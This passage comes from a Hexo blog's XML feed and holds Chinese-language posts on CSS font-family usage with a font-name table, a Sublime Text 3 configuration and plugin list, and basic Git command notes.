</ol>
]]></content>
      
        <categories>
            
            <category> 来自MOxFIVE的优秀笔记 </category>
            
            <category> 博客配置 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[(我转转转)CSS font-family 网页字体使用小结]]></title>
      <url>http://yikunhaocong.com/2015/12/09/css-font-family/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>一直到最近才开始调整博客的字体，之前都是全站微软雅黑了事。慢慢调整后发现 font-family 这个属性相关的知识还是不少的，整理一下常用的部分，分享于此。<p></p>
<a id="more"></a>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="使用语法"><a href="#使用语法" class="headerlink" title="使用语法"></a>使用语法</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">font-family</span>: 字体名1, 字体名2, 字体名<span class="selector-tag">n</span>, 字体系列名;</div><div class="line"><span class="selector-tag">font-family</span>: <span class="selector-tag">Verdana</span>, <span class="selector-tag">Helvetica</span>, "<span class="selector-tag">Microsoft</span> <span class="selector-tag">YaHei</span>", <span class="selector-tag">Arial</span>;</div></pre></td></tr></table></figure>
<h3 id="语法说明"><a href="#语法说明" class="headerlink" title="语法说明"></a>语法说明</h3><blockquote>
<ol>
<li>系统将选择列表中最先可用的字体来显示文字;</li>
<li>因为规则1，通常在最末添加一个 generic-family 字体系列名，保证文字获得相似的显示效果;</li>
<li>因为规则1，西文字体名应该写在中文字体前，这样才能中英文同时使用不同字体;</li>
<li>字体名为中文或包含空格等时，需要加双引号””才能正确识别;</li>
<li>中文字体建议也是用其对应英文字体名，如”微软雅黑”为”Microsoft YaHei”，以提高编码兼容性。</li>
</ol>
</blockquote>
<h2 id="常见字体系列"><a href="#常见字体系列" class="headerlink" title="常见字体系列"></a>常见字体系列</h2><h3 id="Serif-衬线字体"><a href="#Serif-衬线字体" class="headerlink" title="Serif 衬线字体"></a>Serif 衬线字体</h3><ul>
<li>Times New Roman, Georgia 和宋体都是很常见的衬线字体；</li>
<li>特征: 文字笔划的开始或结束处有额外的装饰，笔划有粗细之分。</li>
</ul>
<p><img src="/resources/serif.png" alt="serif"></p>
<h3 id="Sans-serif-无衬线字体"><a href="#Sans-serif-无衬线字体" class="headerlink" title="Sans-serif 无衬线字体"></a>Sans-serif 无衬线字体</h3><ul>
<li>Arial, Verdana, Tahoma, 微软雅黑都是很常见的无衬线字体;</li>
<li>说明: <code>sans-</code>源于法语前缀，意思为<code>没有</code>。Sans-serif 也就是指无衬线字体。</li>
<li>特征: 字体比较圆滑，笔划较为均匀。</li>
</ul>
<p><img src="/resources/sans-serif.png" alt="sans-serif"></p>
<ul>
<li>字体选用: 有种说法是正文多用衬线字体，易于区分；标题多用无衬线字体。不过这个也看个人喜好，我更习惯正文用无衬线字体。如果实在不知道怎么选，随便找一个自己看着舒服的网站，套用它的字体样式好了。</li>
</ul>
<h3 id="Monospace-等宽字体"><a href="#Monospace-等宽字体" class="headerlink" title="Monospace 等宽字体"></a>Monospace 等宽字体</h3><ul>
<li>Courier New, Consolas, Menlo 都是比较常见的等宽字体;</li>
<li>特征: 字母、数字、空格以及其他符号所占宽度都一致。识别度高，易于对齐和定位，通常用于显示代码。</li>
</ul>
<p><img src="/resources/Monospace.png" alt="Monospace"></p>
<ul>
<li>一个优秀的代码字体除了等宽外，还应该能较好地区分出<code>0 o O i l 1 I &quot;&quot; &#39;&#39; [] () {}</code> 等字符。</li>
</ul>
<h3 id="Cursive-手写体"><a href="#Cursive-手写体" class="headerlink" title="Cursive 手写体"></a>Cursive 手写体</h3><ul>
<li>Comic Sans, Author, 华文行楷都是比较常见的仿手写体;</li>
<li>特征: 模仿人的手写体，笔划圆滑或者有连笔等装饰。英文的花体，中文的行书草书等都属于此类。</li>
</ul>
<p><img src="/resources/cursive.png" alt="cursive"></p>
<h2 id="获取字体名称"><a href="#获取字体名称" class="headerlink" title="获取字体名称"></a>获取字体名称</h2><p>同一个字体在不同系统和应用中可能会显示为不同名字，但其内部一般有一个不变的英文名字。CSS font-family 需要引用的就是字体的内部名字。</p>
<h3 id="本地字体"><a href="#本地字体" class="headerlink" title="本地字体"></a>本地字体</h3><ul>
<li>Win 上通过搜索或控制面板进入字体文件夹，然后双击字体查看字体名称;</li>
<li>通过软件，如记事本、Office 等也可以查看字体名字:</li>
</ul>
<p><img src="/resources/font-a1.png" alt="font-a1"></p>
<ul>
<li>Mac 上搜索打开字体册即可，中间一栏显示的就是字体名称:</li>
</ul>
<p><img src="/resources/font-a2.png" alt="font-a2"></p>
<h3 id="网页字体"><a href="#网页字体" class="headerlink" title="网页字体"></a>网页字体</h3><ul>
<li>审查元素，查看生效的 font-family:</li>
</ul>
<p><img src="/resources/font-a3.png" alt="font-a3"></p>
<ul>
<li>通过 Chrome 插件 <a href="http://chengyinliu.com/whatfont.html" target="_blank" rel="external">WhatFont</a>:</li>
</ul>
<p><img src="/resources/font-a4.png" alt="font-a4"></p>
<h2 id="字体图标"><a href="#字体图标" class="headerlink" title="字体图标"></a>字体图标</h2><p>使用<code>@font-face</code>引入字体后，可以像使用文字那样，无损的控制图标的大小，颜色等样式。常见的有 Webdings，Wingdings, <a href="http://fontawesome.io/" target="_blank" rel="external">Font Awesome</a>.</p>
<p><img src="/resources/font-icon.png" alt="font-icon"></p>
<h2 id="备用记录"><a href="#备用记录" class="headerlink" title="备用记录"></a>备用记录</h2><h3 id="字体配置"><a href="#字体配置" class="headerlink" title="字体配置"></a>字体配置</h3><ul>
<li>下面是自己目前比较常用的字体配置，通常按系列设置为 CSS 预处理器的变量，方便调用。</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//中文</span></div><div class="line"><span class="attribute">font</span>-chs = <span class="string">"Microsoft YaHei"</span>, <span class="string">"Hiragino Sans GB"</span>, <span class="string">"WenQuanYi Micro Hei"</span></div><div class="line"><span class="comment">//无衬线字体 sans-serif</span></div><div class="line"><span class="attribute">font</span>-sans = Verdana, <span class="string">"Helvetica Neue"</span>, Helvetica, Tahoma, Arial</div><div class="line"><span class="comment">//衬线字体 serif</span></div><div class="line"><span class="attribute">font</span>-serif = Times, Georgia</div><div class="line"><span class="comment">//等宽字体 monospace</span></div><div class="line"><span class="attribute">font</span>-mono = Menlo, Consolas, <span class="string">"Source Code Pro"</span>, Inconsolata, Monaco, <span class="string">"Courier New"</span></div></pre></td></tr></table></figure>
<h3 id="字体英文名"><a href="#字体英文名" class="headerlink" title="字体英文名"></a>字体英文名</h3><ul>
<li>一些常见中文字体的对应英文名。</li>
</ul>
<style>
    .fa-apple {
        color: #9d9e9d;
    }
    .fa-windows {
        color: #4ca6e7;
    }
</style>

<table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>中文名</th>
<th>英文名</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><i class="fa fa-apple"></i> 苹方</td>
<td>PingFang SC</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><i class="fa fa-apple"></i> 冬青黑/苹果丽黑</td>
<td>Hiragino Sans GB</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><i class="fa fa-apple"></i> 思源黑体</td>
<td>Source Han Sans CN</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><i class="fa fa-apple"></i> 华文细黑</td>
<td>STHeiti Light [STXihei]</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><i class="fa fa-apple"></i> 华文黑体</td>
<td>ST Heiti</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><i class="fa fa-apple"></i> 华文楷体</td>
<td>STKaiti</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><i class="fa fa-apple"></i> 华文宋体</td>
<td>STSong</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><i class="fa fa-apple"></i> 华文仿宋</td>
<td>STFangsong</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><i class="fa fa-apple"></i> 丽黑 Pro</td>
<td>LiHei Pro Medium</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><i class="fa fa-apple"></i> 丽宋 Pro</td>
<td>LiSong Pro Light</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><i class="fa fa-apple"></i> 标楷体</td>
<td>BiauKai</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><i class="fa fa-apple"></i> 苹果丽中黑</td>
<td>Apple LiGothic Medium</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><i class="fa fa-apple"></i> 苹果丽细宋</td>
<td>Apple LiSung Light</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><i class="fa fa-windows"></i> 新细明体</td>
<td>PMingLiU</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><i class="fa fa-windows"></i> 细明体</td>
<td>MingLiU</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><i class="fa fa-windows"></i> 标楷体</td>
<td>DFKai-SB</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td><i class="fa fa-windows"></i> (中易)黑体</td>
<td>SimHei</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td><i class="fa fa-windows"></i> 宋体</td>
<td>SimSun</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td><i class="fa fa-windows"></i> 新宋体</td>
<td>NSimSun</td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td><i class="fa fa-windows"></i> 仿宋</td>
<td>FangSong</td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td><i class="fa fa-windows"></i> 楷体</td>
<td>KaiTi</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td><i class="fa fa-windows"></i> 仿宋_GB2312</td>
<td>FangSong_GB2312</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td><i class="fa fa-windows"></i> 楷体_GB2312</td>
<td>KaiTi_GB2312</td>
</tr>
<tr>
<td style="text-align:center">24</td>
<td><i class="fa fa-windows"></i> 微软正黑体</td>
<td>Microsoft JhengHei</td>
</tr>
<tr>
<td style="text-align:center">25</td>
<td><i class="fa fa-windows"></i> 微软雅黑</td>
<td>Microsoft YaHei</td>
</tr>
<tr>
<td style="text-align:center">26</td>
<td><i class="fa fa-file-word-o"></i>  隶书</td>
<td>LiSu</td>
</tr>
<tr>
<td style="text-align:center">27</td>
<td><i class="fa fa-file-word-o"></i>  幼圆</td>
<td>YouYuan</td>
</tr>
<tr>
<td style="text-align:center">28</td>
<td><i class="fa fa-file-word-o"></i>  华文中宋</td>
<td>STZhongsong</td>
</tr>
<tr>
<td style="text-align:center">29</td>
<td><i class="fa fa-file-word-o"></i>  方正舒体</td>
<td>FZShuTi</td>
</tr>
<tr>
<td style="text-align:center">30</td>
<td><i class="fa fa-file-word-o"></i>  方正姚体</td>
<td>FZYaoti</td>
</tr>
<tr>
<td style="text-align:center">31</td>
<td><i class="fa fa-file-word-o"></i>  华文彩云</td>
<td>STCaiyun</td>
</tr>
<tr>
<td style="text-align:center">32</td>
<td><i class="fa fa-file-word-o"></i>  华文琥珀</td>
<td>STHupo</td>
</tr>
<tr>
<td style="text-align:center">33</td>
<td><i class="fa fa-file-word-o"></i>  华文隶书</td>
<td>STLiti</td>
</tr>
<tr>
<td style="text-align:center">34</td>
<td><i class="fa fa-file-word-o"></i>  华文行楷</td>
<td>STXingkai</td>
</tr>
<tr>
<td style="text-align:center">35</td>
<td><i class="fa fa-file-word-o"></i>  华文新魏</td>
<td>STXinwei</td>
</tr>
<tr>
<td style="text-align:center">36</td>
<td><i class="fa fa-linux"></i> 文泉驿微米黑</td>
<td>Wenquanyi Micro Hei</td>
</tr>
<tr>
<td style="text-align:center">37</td>
<td><i class="fa fa-linux"></i> 文泉驿正黑</td>
<td>WenQuanYi Zen Hei</td>
</tr>
<tr>
<td style="text-align:center">38</td>
<td><i class="fa fa-linux"></i> 文泉驿点阵正黑</td>
<td>WenQuanYi Zen Hei Sharp</td>
</tr>
</tbody>
</table>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ol>
<li><strong>Font Awesome</strong>: <a href="http://fontawesome.io/" target="_blank" rel="external">http://fontawesome.io/</a></li>
<li><strong>Webdings和Wingdings字符码对应表</strong>: <a href="http://dwz.cn/2jOjYi" target="_blank" rel="external">http://dwz.cn/2jOjYi</a></li>
<li><strong><em>CSS魔法堂：再次认识 font</em></strong> by <strong>肥仔John</strong> on <code>2015/3/3</code>: <a href="http://www.cnblogs.com/fsjohnhuang/p/4310533.html" target="_blank" rel="external">http://www.cnblogs.com/fsjohnhuang/p/4310533.html</a></li>
<li><strong>有字库-中文在线字体</strong>: <a href="http://www.youziku.com/" target="_blank" rel="external">http://www.youziku.com/</a></li>
<li><strong><em>谈谈网页设计中的字体应用 (2) serif 和 sans-serif</em></strong> by <strong>棕熊</strong> on <code>2008/5/6</code>: <a href="http://www.cnblogs.com/ruxpinsp1/archive/2008/05/06/font-in-front-end-development-2.html" target="_blank" rel="external">http://www.cnblogs.com/ruxpinsp1/archive/2008/05/06/font-in-front-end-development-2.html</a></li>
<li><strong><em>Serif 和 Sans Serif 字体的区别</em></strong> by <strong>冰火九九</strong> on <code>2013/11/4</code>: <a href="http://blog.jobbole.com/50828/" target="_blank" rel="external">http://blog.jobbole.com/50828/</a></li>
<li><strong><em>Chinese Web Font Guide</em></strong> by <strong>Kendra Schaefer</strong> on <code>2012/6/11</code>: <a href="http://www.kendraschaefer.com/2012/06/chinese-standard-web-fonts-the-ultimate-guide-to-css-font-family-declarations-for-web-design-in-simplified-chinese/" target="_blank" rel="external">http://www.kendraschaefer.com/2012/06/chinese-standard-web-fonts-the-ultimate-guide-to-css-font-family-declarations-for-web-design-in-simplified-chinese/</a></li>
<li><strong>Fonts.css – 跨平台中文字体解决方案</strong>: <a href="http://zenozeng.github.io/fonts.css/" target="_blank" rel="external">http://zenozeng.github.io/fonts.css/</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 来自MOxFIVE的优秀笔记 </category>
            
            <category> 网页设计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> font-family </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Sublime Text 3 使用配置与插件安装]]></title>
      <url>http://yikunhaocong.com/2015/11/30/sublime-config/</url>
      <content type="html"><![CDATA[<p>　　记录安装配置 Sublime 的过程，同时列出所用到的插件，方便自己在新系统新电脑上快速用上熟悉的 Sublime。 </p>
<a id="more"></a>
<h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><h3 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h3><ul>
<li>一直使用的是 Sublime 3，直接转到 3 的 <a href="http://www.sublimetext.com/3" target="_blank" rel="external">下载页面</a> 好了。</li>
</ul>
<h3 id="用户设置"><a href="#用户设置" class="headerlink" title="用户设置"></a>用户设置</h3><ul>
<li><code>Preferences/Settings - User</code>，设置字体为 <a href="http://pan.baidu.com/s/1mglgkSK" target="_blank" rel="external">Consolas 雅黑混合体</a> yx5g，字号11，tab 转空格，显示空格和制表符。</li>
</ul>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">"font_face"</span>: <span class="string">"Yahei Consolas Hybrid"</span>,</div><div class="line"><span class="string">"font_size"</span>: <span class="number">11</span>,</div><div class="line"><span class="string">"translate_tabs_to_spaces"</span>: <span class="literal">true</span>,</div><div class="line"><span class="string">"draw_white_space"</span>: <span class="string">"all"</span>,</div><div class="line"></div><div class="line"><span class="comment">/*统一使用 UTF-8 编码和 UNIX 风格的换行符(LF, 0x0A)*/</span></div><div class="line"><span class="string">"default_line_ending"</span>: <span class="string">"unix"</span>,</div><div class="line"><span class="string">"default_encoding"</span>: <span class="string">"UTF-8"</span>,</div></pre></td></tr></table></figure>
<blockquote>
<p>其他设置参考 <code>Preferences/Settings - Default</code>。</p>
</blockquote>
<h2 id="基础插件"><a href="#基础插件" class="headerlink" title="基础插件"></a>基础插件</h2><h3 id="Package-Control"><a href="#Package-Control" class="headerlink" title="Package Control"></a><a href="https://packagecontrol.io/" target="_blank" rel="external">Package Control</a></h3><ul>
<li>用于管理插件的插件，基础中的基础。之后列的插件全部通过 Package Control 安装。<blockquote>
<p>插件使用与安装: <a href="https://packagecontrol.io/installation" target="_blank" rel="external">https://packagecontrol.io/installation</a></p>
</blockquote>
</li>
</ul>
<h3 id="Convert​To​UTF8"><a href="#Convert​To​UTF8" class="headerlink" title="Convert​To​UTF8"></a><a href="https://packagecontrol.io/packages/ConvertToUTF8" target="_blank" rel="external">Convert​To​UTF8</a></h3><ul>
<li>文本编码自动转换，减少中日韩文乱码问题。<blockquote>
<p>插件安装: Ctrl+Shift+P, Package Control: Installed Packages, 搜索 Convert​To​UTF8</p>
</blockquote>
</li>
</ul>
<h3 id="IMESupport"><a href="#IMESupport" class="headerlink" title="IMESupport"></a><a href="https://packagecontrol.io/packages/IMESupport" target="_blank" rel="external">IMESupport</a></h3><ul>
<li>解决输入法选字框不跟随问题。</li>
</ul>
<h3 id="Side​Bar​Enhancements"><a href="#Side​Bar​Enhancements" class="headerlink" title="Side​Bar​Enhancements"></a><a href="https://packagecontrol.io/packages/SideBarEnhancements" target="_blank" rel="external">Side​Bar​Enhancements</a></h3><ul>
<li>自带边栏功能太少，必须安装此插件增强一下。</li>
</ul>
<h2 id="主题配色"><a href="#主题配色" class="headerlink" title="主题配色"></a>主题配色</h2><h3 id="Theme-Spacegray"><a href="#Theme-Spacegray" class="headerlink" title="Theme - Spacegray"></a><a href="https://packagecontrol.io/packages/Theme%20-%20Spacegray" target="_blank" rel="external">Theme - Spacegray</a></h3><ul>
<li>Spacegray 主题的 Base16 Eighties Dark 配色方案看着最顺眼，用着最舒服。<br><img src="/resources/Base16-Eighties-Dark.jpg" alt="Base16 Eighties Dark color scheme"></li>
</ul>
<h2 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h2><h3 id="Sublime​Linter"><a href="#Sublime​Linter" class="headerlink" title="Sublime​Linter"></a><a href="https://packagecontrol.io/packages/SublimeLinter" target="_blank" rel="external">Sublime​Linter</a></h3><ul>
<li>用于管理其他 code linting 代码规范插件。<blockquote>
<p>使用说明: <a href="http://sublimelinter.readthedocs.org/en/latest/installation.html#installing-via-pc" target="_blank" rel="external">http://sublimelinter.readthedocs.org/en/latest/installation.html#installing-via-pc</a></p>
</blockquote>
</li>
</ul>
<h3 id="Sublime​Linter-jshint"><a href="#Sublime​Linter-jshint" class="headerlink" title="Sublime​Linter-jshint"></a><a href="https://packagecontrol.io/packages/SublimeLinter-jshint" target="_blank" rel="external">Sublime​Linter-jshint</a></h3><ul>
<li>基于 <a href="http://jshint.com/" target="_blank" rel="external">JSHint</a>，用于检查规范 JavaScript 代码。<blockquote>
<p>NPM 依赖包: <code>npm install -g jshint</code><br>使用说明: <a href="https://github.com/SublimeLinter/SublimeLinter-jshint" target="_blank" rel="external">https://github.com/SublimeLinter/SublimeLinter-jshint</a></p>
</blockquote>
</li>
</ul>
<h3 id="Sublime​Linter-csslint"><a href="#Sublime​Linter-csslint" class="headerlink" title="Sublime​Linter-csslint"></a><a href="https://packagecontrol.io/packages/SublimeLinter-csslint" target="_blank" rel="external">Sublime​Linter-csslint</a></h3><ul>
<li>基于 <a href="https://github.com/CSSLint/csslint" target="_blank" rel="external">CSSLint</a>，用于检查规范 CSS 代码。<blockquote>
<p>NPM 依赖包: <code>npm install -g csslint</code><br>使用说明: <a href="https://github.com/SublimeLinter/SublimeLinter-csslint" target="_blank" rel="external">https://github.com/SublimeLinter/SublimeLinter-csslint</a></p>
</blockquote>
</li>
</ul>
<h3 id="Sublime​Linter-contrib-htmlhint"><a href="#Sublime​Linter-contrib-htmlhint" class="headerlink" title="Sublime​Linter-contrib-htmlhint"></a><a href="https://packagecontrol.io/packages/SublimeLinter-contrib-htmlhint" target="_blank" rel="external">Sublime​Linter-contrib-htmlhint</a></h3><ul>
<li>基于 <a href="http://htmlhint.com/" target="_blank" rel="external">HTMLHint</a>，用于检查规范 HTML 代码。<blockquote>
<p>NPM 依赖包: <code>npm install -g htmlhint@latest</code><br>使用说明: <a href="https://github.com/mmaday/SublimeLinter-contrib-htmlhint" target="_blank" rel="external">https://github.com/mmaday/SublimeLinter-contrib-htmlhint</a></p>
</blockquote>
</li>
</ul>
<h2 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h2><h3 id="HTML-CSS-JS-Prettify"><a href="#HTML-CSS-JS-Prettify" class="headerlink" title="HTML-CSS-JS Prettify"></a><a href="https://packagecontrol.io/packages/HTML-CSS-JS%20Prettify" target="_blank" rel="external">HTML-CSS-JS Prettify</a></h3><ul>
<li>格式化 HTML, CSS, JavaScript 及 JSON 代码。</li>
</ul>
<h3 id="Color-Highlighter"><a href="#Color-Highlighter" class="headerlink" title="Color Highlighter"></a><a href="https://packagecontrol.io/packages/Color%20Highlighter" target="_blank" rel="external">Color Highlighter</a></h3><ul>
<li>直接在代码中预览颜色。</li>
</ul>
<h3 id="Stylus"><a href="#Stylus" class="headerlink" title="Stylus"></a><a href="https://packagecontrol.io/packages/Stylus" target="_blank" rel="external">Stylus</a></h3><ul>
<li>使代码高亮支持 Stylus。</li>
</ul>
<h3 id="Stylus-Clean-Completions"><a href="#Stylus-Clean-Completions" class="headerlink" title="Stylus Clean Completions"></a><a href="https://packagecontrol.io/packages/Stylus%20Clean%20Completions" target="_blank" rel="external">Stylus Clean Completions</a></h3><ul>
<li>Stylus 代码自动补全。</li>
</ul>
<h3 id="AutoFileName"><a href="#AutoFileName" class="headerlink" title="AutoFileName"></a><a href="https://packagecontrol.io/packages/AutoFileName" target="_blank" rel="external">AutoFileName</a></h3><ul>
<li>文件名自动补全。<br><img src="/resources/autofilename.png" alt="AutoFileName"></li>
</ul>
<h3 id="Can-I-Use"><a href="#Can-I-Use" class="headerlink" title="Can I Use"></a><a href="https://packagecontrol.io/packages/Can%20I%20Use" target="_blank" rel="external">Can I Use</a></h3><ul>
<li><a href="http://caniuse.com/" target="_blank" rel="external">http://caniuse.com/</a> 的插件版，快速查询 HTML, CSS 等前端技术的浏览器兼容性</li>
</ul>
<h3 id="BracketHighlighter"><a href="#BracketHighlighter" class="headerlink" title="BracketHighlighter"></a><a href="https://packagecontrol.io/packages/BracketHighlighter" target="_blank" rel="external">BracketHighlighter</a></h3><ul>
<li>调整各类括号匹配的高亮样式</li>
</ul>
<h3 id="To-be-added"><a href="#To-be-added" class="headerlink" title="To be added"></a>To be added</h3><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ol>
<li><strong>Package Control</strong>: <a href="https://packagecontrol.io/" target="_blank" rel="external">https://packagecontrol.io/</a></li>
<li><strong>SublimeLinter</strong>: <a href="http://sublimelinter.readthedocs.org/" target="_blank" rel="external">http://sublimelinter.readthedocs.org/</a></li>
<li><strong>JSHint</strong>: <a href="http://jshint.com/" target="_blank" rel="external">http://jshint.com/</a></li>
<li><strong>CSSLint</strong>: <a href="https://github.com/CSSLint/csslint" target="_blank" rel="external">https://github.com/CSSLint/csslint</a></li>
<li><strong>HTMLHint</strong>: <a href="http://htmlhint.com/" target="_blank" rel="external">http://htmlhint.com/</a></li>
<li><strong>Stylus</strong>: <a href="http://learnboost.github.io/stylus/" target="_blank" rel="external">http://learnboost.github.io/stylus/</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 来自MOxFIVE的优秀笔记 </category>
            
            <category> 软件配置 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Sublime </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git 基础命令与相关术语]]></title>
      <url>http://yikunhaocong.com/2015/11/23/git-command/</url>
      <content type="html"><![CDATA[<p>　　作者MOxFIVE的笔记基本上整理自网站 <a href="https://try.github.io" target="_blank" rel="external">Try Git</a>，一套很不错的 Git 在线入门教程。</p>
<a id="more"></a>
<h2 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h2><p>To initialize a Git repository here</p>
<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><ul>
<li>A folder used for storing multiple files.</li>
</ul>
<h3 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h3><ul>
<li>A directory where Git has been initialized to start version controlling your files.</li>
</ul>
<h2 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h2><p>See what the current state of the project is.</p>
<h3 id="staged"><a href="#staged" class="headerlink" title="staged"></a>staged</h3><ul>
<li>Files are ready to be committed.<h3 id="unstaged"><a href="#unstaged" class="headerlink" title="unstaged"></a>unstaged</h3></li>
<li>Files with changes that have not been prepared to be committed.<h3 id="untracked"><a href="#untracked" class="headerlink" title="untracked"></a>untracked</h3></li>
<li>Files aren’t tracked by Git yet. This usually indicates a newly created file.<h3 id="deleted"><a href="#deleted" class="headerlink" title="deleted"></a>deleted</h3></li>
<li>File has been deleted and is waiting to be removed from Git.</li>
</ul>
<h2 id="git-add-lt-file-gt"><a href="#git-add-lt-file-gt" class="headerlink" title="git add &lt;file&gt;"></a>git add <code>&lt;file&gt;</code></h2><p>Add files to the staging area.</p>
<h3 id="Staging-Area"><a href="#Staging-Area" class="headerlink" title="Staging Area"></a>Staging Area</h3><ul>
<li>A place where we can group files together before we “commit” them to Git.<br>Commit</li>
</ul>
<h3 id="add-all"><a href="#add-all" class="headerlink" title="add all"></a>add all</h3><ul>
<li>You can also type <code>git add -A</code> . where the dot stands for the current directory, so everything in and beneath it is added. The <code>-A</code> ensures even file deletions are included.</li>
</ul>
<h2 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h2><p>You can use <code>git reset &lt;filename&gt;</code> to remove a file or files from the staging area.</p>
<h2 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h2><p>A “commit” is a snapshot of our repository. This way if we ever need to look back at the changes we’ve made (or if someone else does), we will see a nice timeline of all changes.</p>
<h3 id="git-commit-m-“msg”"><a href="#git-commit-m-“msg”" class="headerlink" title="git commit -m “msg”"></a>git commit -m “msg”</h3><ul>
<li>To store our staged changes we run the commit command with a message describing what we’ve changed. </li>
</ul>
<h3 id="‘-a’-option"><a href="#‘-a’-option" class="headerlink" title="‘-a’ option"></a>‘-a’ option</h3><ul>
<li>Auto removes deleted files with the commit.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git commit -am &quot;msg&quot;</div></pre></td></tr></table></figure>
<h2 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h2><p>a journal that remembers all the changes we’ve committed so far</p>
<h3 id="git-log-–summary"><a href="#git-log-–summary" class="headerlink" title="git log –summary"></a>git log –summary</h3><ul>
<li>see more information for each commit. You can see where new files were added for the first time or where files were deleted. It’s a good overview of what’s going on in the project.</li>
</ul>
<h2 id="git-remote"><a href="#git-remote" class="headerlink" title="git remote"></a>git remote</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git remote add &lt;remote name&gt; &lt;repository URL&gt;</div><div class="line">git remote add origin https://github.com/try-git/try_git.git</div></pre></td></tr></table></figure>
<p>Git doesn’t care what you name your remotes, but it’s typical to name your main one <code>origin</code>.</p>
<p>It’s also a good idea for your main repository to be on a remote server like GitHub in case your machine is lost at sea during a transatlantic boat cruise or crushed by three monkey statues during an earthquake.</p>
<h2 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h2><p>Tells Git where to put our commits when we’re ready.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git push -u &lt;remote name&gt; &lt;branch name&gt;</div><div class="line">git push -u origin master</div></pre></td></tr></table></figure>
<p>The <code>-u</code> tells Git to remember the parameters, so that next time we can simply run <code>git push</code>.</p>
<h2 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h2><p>Sometimes when you go to pull you may have changes you don’t want to commit just yet. One option you have, other than commiting, is to stash the changes.</p>
<p>Use the command <code>git stash</code> to stash your changes, and <code>git stash apply</code> to re-apply your changes after your pull.</p>
<h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git push &lt;remote name&gt; &lt;branch name&gt;</div><div class="line">git pull origin master</div></pre></td></tr></table></figure>
<p>Check for changes on remote repository and pull down any new changes.</p>
<h2 id="git-diff"><a href="#git-diff" class="headerlink" title="git diff"></a>git diff</h2><p>A good overview of changes we have made and lets us add files or directories one at a time and commit them separately.</p>
<h3 id="git-diff-HEAD"><a href="#git-diff-HEAD" class="headerlink" title="git diff HEAD"></a>git diff HEAD</h3><ul>
<li>Show what is different from our last commit. <code>HEAD</code> points to your most recent commit by default.</li>
</ul>
<h3 id="git-diff-–staged"><a href="#git-diff-–staged" class="headerlink" title="git diff –staged"></a>git diff –staged</h3><ul>
<li>Look at changes within files that have already been staged.</li>
</ul>
